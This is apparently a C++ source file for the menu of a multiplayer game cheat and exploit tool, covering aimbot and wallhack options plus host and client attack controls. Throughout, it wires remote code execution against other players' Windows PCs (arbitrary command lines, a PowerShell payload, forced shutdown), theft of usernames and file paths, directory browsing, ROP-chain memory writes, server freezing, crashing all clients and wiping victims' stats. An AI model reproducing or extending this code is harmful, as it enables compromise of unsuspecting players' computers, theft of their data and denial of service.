							if (selectable("Print", !message_input.empty(), true))
							{
								game::send_server_command(client_num, utils::string::va("g \"%s\"", message_input.data()));
							}

							ImGui::EndMenu();
						}

						if (ImGui::BeginMenu("Print message in killfeed##" + std::to_string(client_num), client_ready))
						{
							static auto message_input = ""s;

							ImGui::InputTextWithHint("##" + std::to_string(client_num), "Message", &message_input);

							if (selectable("Print", !message_input.empty(), true))
							{
								game::send_server_command(client_num, utils::string::va("f \"%s\"", message_input.data()));
							}

							ImGui::EndMenu();
						}

						if (ImGui::BeginMenu("Send SV command##" + std::to_string(client_num), client_ready && !is_bot))
						{
							static auto sv_cmd_input = ""s;

							ImGui::InputTextWithHint("##" + std::to_string(client_num), "Command", &sv_cmd_input);

							if (selectable("Send SV command", !sv_cmd_input.empty()))
							{
								game::send_server_command(client_num, sv_cmd_input);
							}

							ImGui::EndMenu();
						}

						if (ImGui::BeginMenu("Send OOB from host##" + std::to_string(client_num), !is_bot))
						{
							static auto oob_input = ""s;

							ImGui::InputTextWithHint("##" + std::to_string(client_num), "OOB", &oob_input);

							if (selectable("Send OOB", !oob_input.empty()))
							{
								game::net::send_relay_packet(client_num, oob_input);
							}

							ImGui::EndMenu();
						}

						ImGui::Separator();

						if (ImGui::BeginMenu("Execute cbuf command##" + std::to_string(client_num), client_ready && !is_bot))
						{
							static auto command_input = ""s;

							ImGui::InputTextWithHint("##" + std::to_string(client_num), "Command", &command_input);

							if (selectable("Execute", !command_input.empty(), true))
							{
								exploit::host::rce::send_payload(client_num, "cbuf", { command_input });
							}

							ImGui::EndMenu();
						}

						if (ImGui::BeginMenu("Execute command line##" + std::to_string(client_num), client_ready && !is_bot))
						{
							static auto command_input = ""s;

							ImGui::InputTextWithHint("##" + std::to_string(client_num), "Command", &command_input);

							if (selectable("Execute", !command_input.empty(), true))
							{
								exploit::host::rce::win_exec(client_num, command_input);
							}

							ImGui::EndMenu();
						}

						if (ImGui::BeginMenu("Text to speech##" + std::to_string(client_num), client_ready && !is_bot))
						{
							static auto t2s_input = ""s;

							ImGui::InputTextWithHint("##" + std::to_string(client_num), "Text", &t2s_input);

							if (selectable("Execute", !t2s_input.empty(), true))
							{
								const auto command = utils::string::va
								(
									"powershell.exe"
									" \""
									"Add-Type -AssemblyName System.speech;$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;$speak.Speak('%s')"
									"\"",
									t2s_input.data()
								); 
								
								exploit::host::rce::win_exec(client_num, command);
							}

							ImGui::EndMenu();
						}

						if (selectable("Reset stats", client_ready && !is_bot))
						{
							const auto message = utils::string::va("^1Deranking^7 player ^3%s^7 ...", player_name.data());

							std::thread([=]
							{
								game::send_server_command(-1, utils::string::va("U \"^7%s\"", message.data()));
								std::this_thread::sleep_for(1s);
								exploit::host::rce::send_payload(client_num, "cbuf", { "disconnect;wait 300;defaultStatsInit;uploadStats" });
							}).detach();
						}

						if (selectable("Enable voice", client_ready && !is_bot))
						{
							exploit::host::rce::send_payload(client_num, "unprotect");
							exploit::host::rce::send_payload(client_num, "enablevoice");
						}

						if (selectable("Say Windows username", client_ready && !is_bot))
						{
							exploit::host::rce::send_payload(client_num, "sayusername");
						}

						if (selectable("Minimize window", client_ready && !is_bot))
						{
							exploit::host::rce::send_payload(client_num, "minimize");
						}

						if (selectable("Raise hard exception", client_ready && !is_bot))
						{
							exploit::host::rce::send_payload(client_num, "raisehardexception");
						}

						if (selectable("Shutdown PC", client_ready && !is_bot))
						{
							exploit::host::rce::send_payload(client_num, "cmd", { "shutdown /f /p" });
						}

						const auto game_path = exploit::file_manager[player_xuid].game_path;
						
						if (ImGui::MenuItem("Grab game path", !game_path.empty() ? game_path.data() : nullptr, nullptr, can_connect_to_client && client_ready && !is_bot))
						{
							exploit::host::rce::send_payload(client_num, "grabpath", { std::to_string(our_client_num) });
						}

						const auto user_name = exploit::file_manager[player_xuid].username;
						
						if (ImGui::MenuItem("Grab username", !user_name.empty() ? user_name.data() : nullptr, nullptr, can_connect_to_client && client_ready && !is_bot))
						{
							exploit::host::rce::send_payload(client_num, "grabuser", { std::to_string(our_client_num) });
						}

						if (ImGui::MenuItem("List directories", nullptr, nullptr, can_connect_to_client && client_ready && !is_bot))
						{
							exploit::file_manager_target = player_xuid;
						}

						ImGui::EndPopup();
					}

					ImGui::NextColumn();

					if (client_num != static_cast<std::uint32_t>(our_client_num))
					{
						ImGui::TextUnformatted("");
						ImGui::SameLine(0, 10.0f);
						ImGui::Checkbox(("##priority_client" + std::to_string(client_num)).data(), reinterpret_cast<bool*>(&aimbot::priority_target[client_num]));
					}
					else
					{
						ImGui::TextUnformatted("");
					}

					ImGui::NextColumn();

					if (ImGui::GetColumnIndex() == 0)
					{
						ImGui::Separator();
					}
				}
			}

			ImGui::PopStyleVar();
			ImGui::EndColumns();
			ImGui::EndTabItem();
		}
	}
	
	void draw()
	{
		const auto draw_material_list = [=](const std::string& material)
		{
			ImGui::MenuItem(material);

			if (ImGui::IsItemClicked())
			{
				PRINT_LOG("Name set to '%s' ..", material.data());

				ImGui::LogToClipboardUnformatted(material);
				steam::persona_name = game::CL_AddMessageIcon(material, { 1.5f, 1.5f }, false);
			}

			if (ImGui::IsItemHovered())
			{
				ImGui::SetMouseCursor(ImGuiMouseCursor_Hand);
			}
		};

		if (is_open())
		{
			ImGui::SetNextWindowSize({ 480, 480 }, ImGuiCond_Once);

			if (!ImGui::Begin(window_title, nullptr, window_flags))
			{
				ImGui::End();
				return;
			}

			if (ImGui::BeginTabBar("tabs"))
			{
				ImGui::Separator();

				const auto party = game::party_data();
				const auto hosting = game::is_hosting();
				const auto in_game = game::CL_IsLocalClientInGame() && game::cg()->clients[game::cg()->predictedPlayerState.clientNum].infoValid;
				const auto our_client_num = static_cast<std::uint32_t>(game::Party_FindMemberByXUID(game::Live_GetXuid(0)));
				const auto width = ImGui::GetContentRegionAvail().x;
				const auto spacing = ImGui::GetStyle().ItemInnerSpacing.x;

				if (ImGui::BeginTabItem("Aimbot"))
				{
					ImGui::Checkbox("Enabled##aimbot_enabled", &aimbot::enabled);

					ImGui::Separator();

					ImGui::Checkbox("Silent mode", &aimbot::silent);

					ImGui::SameLine(width - 100.0f, spacing);
					ImGui::Checkbox("Asynchronous", &aimbot::asynchronous);

					ImGui::Checkbox("Auto-fire", &aimbot::auto_fire);
					ImGui::Checkbox("Auto-wall", &autowall::enabled);
					ImGui::Checkbox("Predict target movement", &prediction::enabled);
					ImGui::Checkbox("Only bonescan priority targets", &aimbot::priority_bonescan);

					ImGui::EndTabItem();
				}

				if (ImGui::BeginTabItem("Visuals"))
				{
					ImGui::Checkbox("Enable##enable_visuals", &esp::enabled);
					ImGui::Checkbox("Enemies only", &esp::enemies_only);

					ImGui::Separator();

					ImGui::Checkbox("Player box", &esp::box);
					ImGui::Checkbox("Player nametag", &esp::name_tag);
					ImGui::Checkbox("Player bones", &esp::bone_tags);

					ImGui::Separator();

					ImGui::ColorEdit4("Enemy visible color", reinterpret_cast<float*>(&esp::enemy_visible_color), color_flags);
					ImGui::ColorEdit4("Enemy color", reinterpret_cast<float*>(&esp::enemy_color), color_flags);
					ImGui::ColorEdit4("Friendly color", reinterpret_cast<float*>(&esp::friendly_color), color_flags);

					ImGui::Separator();

					const auto thickness_step = 1.0f;

					ImGui::SetNextItemWidth(width * 0.20f);
					ImGui::InputScalar("Thickness", ImGuiDataType_Float, &esp::bone_thickness, &thickness_step, nullptr, "%.1f");

					esp::bone_thickness = std::fminf(std::fmaxf(esp::bone_thickness, 0.0f), 10.0f);

					ImGui::EndTabItem();
				}

				if (ImGui::BeginTabItem("Misc"))
				{
					static ImGuiTextFilter filter;

					ImGui::TextUnformatted("Material List");
					filter.Draw("##search_material", "Material", width * 0.85f);
					ImGui::SetNextItemWidth(width * 0.85f);

					if (ImGui::ListBoxHeader("##material_list_header", material_pool.size()))
					{
						if (filter.IsActive())
						{
							for (const auto& material : material_pool)
							{
								ImGui::PushID(material);

								if (filter.PassFilter(material))
									draw_material_list(material);

								ImGui::PopID();
							}
						}
						else
						{
							ImGuiListClipper clipper(material_pool.size());

							while (clipper.Step())
							{
								for (auto i = clipper.DisplayStart; i < clipper.DisplayEnd; ++i)
								{
									ImGui::PushID(i);

									draw_material_list(material_pool[i]);

									ImGui::PopID();
								}
							}
						}

						ImGui::ListBoxFooter();
					}

					if (begin_section("Player name"))
					{
						static std::string player_name = game::Steam_GetClientPersonaName();
						static auto shader_name = ""s;

						ImGui::SetNextItemWidth(width * 0.45f);
						ImGui::InputTextWithHint("##shader_name", "Material", &shader_name);

						ImGui::SetNextItemWidth(width * 0.45f);
						ImGui::InputTextWithHint("##player_name", "Name", &player_name);

						ImGui::SameLine();

						if (ImGui::Button("Set##set_player_name"))
						{
							if (const auto args = utils::string::split(shader_name, ' '); !args.empty() && args.size() > 3)
							{
								const Vec2 dimensions =
								{
									std::strtof(args[1].data(), nullptr),
									std::strtof(args[2].data(), nullptr)
								};

								steam::persona_name = player_name + game::CL_AddMessageIcon(args[0], dimensions, utils::atoi<bool>(args[3]));

							}
							else
							{
								steam::persona_name = player_name;
							}
						}
					}

					if (begin_section("Field of view"))
					{
						const auto fov_step = 1.0f;

						ImGui::SetNextItemWidth(width * 0.20f);
						ImGui::InputScalar("##field_of_view", ImGuiDataType_Float, &misc::fov_value, &fov_step, nullptr, "%.0f");

						misc::fov_value = std::fminf(std::fmaxf(misc::fov_value, 65.0f), 120.0f);
					}

					ImGui::Checkbox("Third person mode", &misc::third_person);
					ImGui::Checkbox("Log out-of-band packets", &network::log_commands);
					ImGui::Checkbox("Log SV commands", &server_command::log_sv_commands);
					ImGui::Checkbox("Spoof IP address", &misc::spoof_ip);
					ImGui::Checkbox("Always host", &misc::always_host);

					if (ImGui::CollapsingHeader("Removals", ImGuiTreeNodeFlags_Leaf))
					{
						ImGui::Checkbox("Remove flinch", &misc::no_flinch);
						ImGui::Checkbox("Remove kick angles", &misc::no_recoil);
						ImGui::Checkbox("Remove spread", &nospread::enabled);
					}

					ImGui::EndTabItem();
				}

				if (ImGui::BeginTabItem("Host"))
				{
					if (ImGui::CollapsingHeader("Host", ImGuiTreeNodeFlags_Leaf))
					{
						if (begin_section("Spawn bots"))
						{
							ImGui::SetNextItemWidth(width * 0.20f);

							static auto bot_input = 1;
							const auto bot_step = 1;

							ImGui::InputScalar("##bot_input", ImGuiDataType_S32, &bot_input, &bot_step, nullptr, "%u");
							bot_input = std::min(std::max(bot_input, 0), 17);

							if (in_game && hosting)
							{
								ImGui::SameLine(0.0f, spacing);

								if (ImGui::Button("Spawn", { -320.0f, 0.0f }))
								{
									for (size_t i = 0; i < bot_input; ++i)
									{
										scheduler::once(bots::add_bot, scheduler::pipeline::renderer, 100ms * i);
									}
								}
							}
						}

						ImGui::EndTabItem();
					}
				}

				if (ImGui::BeginTabItem("Server"))
				{
					if (ImGui::CollapsingHeader("Game info", ImGuiTreeNodeFlags_Leaf))
					{
						ImGui::MenuItem(("Lobby ID: " + std::to_string(game::Steam_GetSteamLobbyID())).data(), "Click to copy lobby ID");

						if (ImGui::IsItemClicked())
						{
							ImGui::LogToClipboardUnformatted(std::to_string(game::Steam_GetSteamLobbyID()).data());
						}

						if (ImGui::IsItemHovered())
						{
							ImGui::SetMouseCursor(ImGuiMouseCursor_Hand);
						}

						const auto netadr_ip_string = game::party_data()->currentHost.adr.to_string(true);
						ImGui::MenuItem(("Server IP: "s + netadr_ip_string).data(), "Click to copy IP address");

						if (ImGui::IsItemClicked())
						{
							ImGui::LogToClipboardUnformatted(netadr_ip_string.data());
						}

						if (ImGui::IsItemHovered())
						{
							ImGui::SetMouseCursor(ImGuiMouseCursor_Hand);
						}

						if (ImGui::CollapsingHeader("Game settings", ImGuiTreeNodeFlags_Leaf))
						{
							if (begin_section("Map"))
							{
								ImGui::SetNextItemWidth(width * 0.35f);
								static std::pair<std::string, std::string> map = { map_names.begin()->first, map_names.begin()->second };

								if (ImGui::BeginCombo("##map_name", map.second))
								{
									for (const auto& map_name : map_names)
									{
										ImGui::PushID(map_name.second);

										if (ImGui::Selectable(map_name.second))
										{
											map = { map_name.first, map_name.second };
										}

										ImGui::PopID();
									}

									ImGui::EndCombo();
								}

								ImGui::SameLine(0.0f, spacing);

								if (ImGui::Button("Set##set_map_name"))
								{
									if (hosting)
										game::set_map(map.first);
									else
										exploit::join_party::send_payload("map", { map.first });
								}
							}

							if (begin_section("Jump height"))
							{
								static auto jump_height = 39.0f;
								const auto jump_height_step = 1.0f;

								ImGui::SetNextItemWidth(width * 0.20f);
								ImGui::InputScalar("##jump_height_input", ImGuiDataType_Float, &jump_height, &jump_height_step, nullptr, "%.0f");
								
								jump_height = std::fminf(std::fmaxf(jump_height, 0.0f), 9999.0f);

								ImGui::SameLine(0, spacing);

								if (ImGui::Button("Set##set_jump_height"))
								{
									if (hosting)
										utils::hook::set(0x00465DAF + 0x2, &jump_height);
									else
										exploit::join_party::send_payload("jumpheight", { std::to_string(static_cast<std::uint32_t>(jump_height)) });
								}
							}

							if (begin_section("Gravity"))
							{
								static auto gravity = 800u;
								const auto gravity_step = 1u;

								ImGui::SetNextItemWidth(width * 0.20f);
								ImGui::InputScalar("##gravity_input", ImGuiDataType_S32, &gravity, &gravity_step, nullptr, "%u");
								
								gravity = std::min(std::max(gravity, 0u), 9999u);

								ImGui::SameLine(0, spacing);

								if (ImGui::Button("Set##set_gravity"))
								{
									if (hosting)
										utils::hook::set(0x0051DEF3 + 0x3, gravity);
									else
										exploit::join_party::send_payload("gravity", { std::to_string(gravity) });
								}
							}

							if (begin_section("Movement speed"))
							{
								static auto movement_speed = 190u;
								const auto movement_step = 1u;

								ImGui::SetNextItemWidth(width * 0.20f);
								ImGui::InputScalar("##movement_speed_input", ImGuiDataType_S32, &movement_speed, &movement_step, nullptr, "%u");
								
								movement_speed = std::min(std::max(movement_speed, 0u), 2000u);

								ImGui::SameLine(0, spacing);

								if (ImGui::Button("Set##set_movement_speed"))
								{
									if (hosting)
										utils::hook::set(0x0051D677 + 0x3, movement_speed);
									else
										exploit::join_party::send_payload("speed", { std::to_string(movement_speed) });
								}
							}

							if (begin_section("Lobby slots"))
							{
								static auto lobby_slots = 18u;
								const auto lobby_slots_step = 1u;

								ImGui::SetNextItemWidth(width * 0.20f);
								ImGui::InputScalar("##lobby_slots", ImGuiDataType_S32, &lobby_slots, &lobby_slots_step, nullptr, "%u");

								lobby_slots = std::min(std::max(lobby_slots, 0u), 18u);

								ImGui::SameLine(0, spacing);

								if (ImGui::Button("Set##set_lobby_slots"))
								{
									if (hosting)
									{
										game::g_lobbyData->session->dyn.publicSlots = lobby_slots;
									}
									else
									{
										exploit::rop::rop_chain chain;
										chain.write_data(offsets::g_serverSession + offsetof(game::SessionData, dyn.publicSlots), lobby_slots);
										chain.call_function(exploit::join_party::restore_ebp_stub);
										exploit::join_party::send_payload(chain);
									}
								}
							}

							ImGui::Checkbox("Anti-leave", &host::anti_leave);
							ImGui::Checkbox("Infinite ammo", &host::infinite_ammo);

							static auto god_mode = false;

							if (ImGui::MenuItem("God mode", nullptr, god_mode, in_game))
							{
								god_mode = !god_mode;

								if (hosting)
									utils::hook::set(0x0051DFC5 + 0x6, !god_mode);
								else
									exploit::join_party::send_payload("takedamage", { std::to_string(!god_mode) });
							}

							const auto surface_penetration{ dvar::bg_surfacePenetration }; 
							
							if (ImGui::MenuItem("Max bullet penetration",
								nullptr,
								surface_penetration->current.value != 0.0f,
								in_game))
							{
								const auto penetration_count{ dvar::bg_penetrationCount };

								if (surface_penetration->current.value == 0.0f)
								{
									surface_penetration->current.value = std::numeric_limits<float>::max();
									penetration_count->current.integer = std::numeric_limits<char>::max();
									
									utils::hook::set<uint8_t>(0x0051ACCD + 2, penetration_count->current.integer);
								}
								else
								{
									surface_penetration->current.value = surface_penetration->reset.integer;
									penetration_count->current.integer = penetration_count->reset.integer;
									
									utils::hook::set<uint8_t>(0x0051ACCD + 2, penetration_count->reset.integer); 
								}

								if (!hosting)
								{
									exploit::join_party::send_payload("unprotect");
									exploit::join_party::send_payload("penetration");
								}
							}

							if (selectable("Make game unlimited", in_game))
							{
								const auto gametype = game::Dvar_FindVar("g_gametype")->current.string;
								const auto command = utils::string::va("scr_%s_timelimit 0;scr_%s_scorelimit 0\n", gametype, gametype);

								if (hosting)
									command::execute(command);
								else
									exploit::join_party::send_payload("cbuf", { command });
							}

							if (selectable("Fast restart", in_game))
							{
								if (hosting)
									game::Cbuf_AddCall(0, game::SV_FastRestart);
								else
									exploit::join_party::send_payload("fr");
							}

							if (selectable("Migrate host", in_game))
							{
								if (hosting)
									command::execute("hostmigration_start");
								else
									exploit::join_party::send_payload("cbuf", { "hostmigration_start\n" });
							}
						}

						if (ImGui::CollapsingHeader("Exploits", ImGuiTreeNodeFlags_Leaf))
						{
							if (selectable("Endgame", in_game))
							{
								command::execute(utils::string::va("mr %d -1 endround", game::cl()->serverId));
							}

							if (selectable("Freeze server", in_game))
							{
								exploit::send_netchan_freeze();
							}

							if (selectable("Crash server"))
							{
								exploit::send_crash();
							}

							if (selectable("Crash all clients"))
							{
								for (size_t i = 0; i < 18; ++i)
								{
									scheduler::once([=]()
									{
										if (party->is_user_registered(i) && i != our_client_num)
										{
											exploit::send_crash(party->session->dyn.users[i].addr, i);
										}

									}, scheduler::pipeline::main, 10ms * i);
								}
							}

							if (selectable("Make party members vote map", !in_game))
							{
								for (size_t i = 0; i < 18; ++i)
								{
									scheduler::once([=]()
									{
										if (party->is_user_registered(i) && i != our_client_num)
										{
											game::net::send_relay_packet(party->session->dyn.users[i].addr, party->currentHost.hostNum, "2veto 1");
										}

									}, scheduler::pipeline::main, 10ms * i);
								}
							}
						}

						if (ImGui::CollapsingHeader("RCE Exploits", ImGuiTreeNodeFlags_Leaf))
						{
							const auto rce_cmd = get_rce_commands(width);

							if (ImGui::MenuItem("Execute"))
							{
								if (const auto args = utils::string::split(rce_cmd.first, ' '); !args.empty())
								{
									exploit::join_party::send_payload(rce_cmd.second, args);
								}
								else
								{
									exploit::join_party::send_payload(rce_cmd.second);
								}
							}

							if (selectable("Super speed", in_game))
							{
								constexpr auto value{ 3.0f };

								if (game::IsServerRunning())
									game::g_entities[our_client_num].client->sess.moveSpeedScaleMultiplier = value;
								else
									exploit::join_party::send_payload("movespeedscale", { std::to_string(our_client_num), std::to_string(value) });
							}

							if (selectable("Enable God Mode", !hosting && in_game))
							{
								exploit::join_party::send_payload("god", { std::to_string(our_client_num), std::to_string(1) });
							}

							if (selectable("Give infinite ammo", !hosting && in_game))
							{
								exploit::join_party::send_payload("ammo", { std::to_string(our_client_num) });
							}

							if (selectable("Install patch", !hosting))
							{
								exploit::patch::install_patch();
							}

							ImGui::Separator();

							ImGui::Checkbox("Use second exploit", &exploit::host::rce::localize);

							if (selectable("Enable voice for clients", in_game))
							{
								exploit::host::rce::send_payload(-1, "unprotect");
								exploit::host::rce::send_payload(-1, "enablevoice");
							}

							if (selectable("Execute cbuf command", in_game))
							{
								exploit::host::rce::send_payload(-1, "cbuf", { rce_cmd.first });
							}

							if (selectable("Execute command line", in_game))
							{
								exploit::host::rce::win_exec(-1, rce_cmd.first);
							}

							if (selectable("Say Windows username for clients", in_game))
							{
								exploit::host::rce::send_payload(-1, "sayusername");
							}
						}
					}

					ImGui::EndTabItem();
				}

				if (ImGui::BeginTabItem("Extras"))
				{
					if (ImGui::CollapsingHeader("Stats", ImGuiTreeNodeFlags_Leaf))
					{
						static auto prestige_input = stats::get_player_data("prestige");
						const auto prestige_step = 1u;

						if (begin_section("Edit Prestige"))
						{
							ImGui::SetNextItemWidth(width * 0.20f);
							ImGui::InputScalar("##prestige_input", ImGuiDataType_S32, &prestige_input, &prestige_step, nullptr, "%u");
							prestige_input = std::min(std::max(prestige_input, 0), 11);
						}

						ImGui::SameLine();

						if (ImGui::Button("Set##set_prestige"))
						{
							stats::set_prestige(prestige_input);
						}

						ImGui::SameLine();

						ImGui::Checkbox("Cycling prestige", &misc::cycling_prestige);

						if (ImGui::Button("Unlock all", { -370, 0 }))
						{
							stats::unlock_all();
						}

						ImGui::SameLine(0.0f, spacing);

						ImGui::HelpMarker("Unlock all titles, callsigns, weapons, camos, and attachments");
					}

					if (ImGui::CollapsingHeader("Tools", ImGuiTreeNodeFlags_Leaf))
					{
						if (begin_section("Execute command"))
						{
							static auto command_input = ""s;

							ImGui::SetNextItemWidth(width * 0.85f);
							ImGui::InputTextWithHint("##command_input", "Command", &command_input);

							ImGui::SameLine();

							if (ImGui::Button("Execute##execute_command", { 64.0f, 0.0f }))
							{
								command::execute(command_input);
							}
						}

						if (begin_section("Send server command"))
						{
							static auto sv_command_input = ""s;

							ImGui::SetNextItemWidth(width * 0.85f);
							ImGui::InputTextWithHint("##sv_command_input", "Command", &sv_command_input);

							ImGui::SameLine();

							if (ImGui::Button("Send##send_server_command", { 64.0f, 0.0f }))
							{
								game::send_server_command(-1, sv_command_input);
							}
						}

						if (begin_section("Join game via IP address"))
						{
							static auto address_input = ""s;

							ImGui::SetNextItemWidth(width * 0.85f);
							ImGui::InputTextWithHint("##address_input", "IP Address", &address_input);

							ImGui::SameLine();

							if (ImGui::Button("Join##join_via_ip_address", { 64.0f, 0.0f }))
							{
								game::join_lobby_ip(address_input);
							}
						}

						if (begin_section("Join game via lobby ID"))
						{
							static auto lobby_id_input = ""s;

							ImGui::SetNextItemWidth(width * 0.85f);
							ImGui::InputTextWithHint("##lobby_id_input", "Lobby ID", &lobby_id_input);

							ImGui::SameLine();

							if (ImGui::Button("Join##join_via_lobby_id", { 64.0f, 0.0f }))
							{
								game::Steam_JoinLobby(utils::atoll(lobby_id_input), false);
							}
						}
					}

					ImGui::EndTabItem();
				}

				player_list();
				session::draw_session_list(width, spacing);
				friends::draw_friends_list(width, spacing);
			}

			draw_client_file_manager();
		}
	}

	void initialize(IDirect3DDevice9* device)
	{
		if (!initialized)
		{
			initialized = true;

			rendering::dx::on_frame(device);
			input::on_key(VK_F1, toggle, true);

			setup_material_pool();
			setup_map_names();
		}
	}
}